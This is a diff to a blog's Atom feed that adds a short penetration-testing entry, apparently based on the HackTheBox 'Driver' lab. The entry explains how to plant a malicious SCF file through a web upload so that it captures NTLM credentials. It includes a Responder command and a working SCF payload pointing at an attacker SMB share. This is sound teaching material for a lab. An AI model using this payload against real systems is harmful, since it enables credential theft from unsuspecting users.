@@ -4,13 +4,64 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-22T10:11:06+08:00</updated>
+ <updated>2022-01-23T08:44:45+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Malicious SCF File Upload</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload"/>
+   <updated>2022-01-23T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/23/Malicious-SCF-Upload</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Attacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.&lt;/p&gt;
+
+&lt;p&gt;One example to access SCF file is via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%SystemRoot%\explorer.exe &quot;C:\Users\victim\desktop&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;environment-setup&quot;&gt;Environment Setup&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Webapp that allows file upload&lt;/li&gt;
+  &lt;li&gt;Some background script inside victim that access the uploaded files&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Open responder on attacker machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; tun0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a malicious SCF file and name it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@evil.scf&lt;/code&gt;. Put the path to attacker share.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=\\10.10.14.13\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Upload the file and wait for someone to access&lt;/li&gt;
+  &lt;li&gt;You should be able to intercept NTLM creds&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB Driver&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&quot;&gt;SMB Share – SCF File Attacks – Penetration Testing Lab&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>IIS</title>
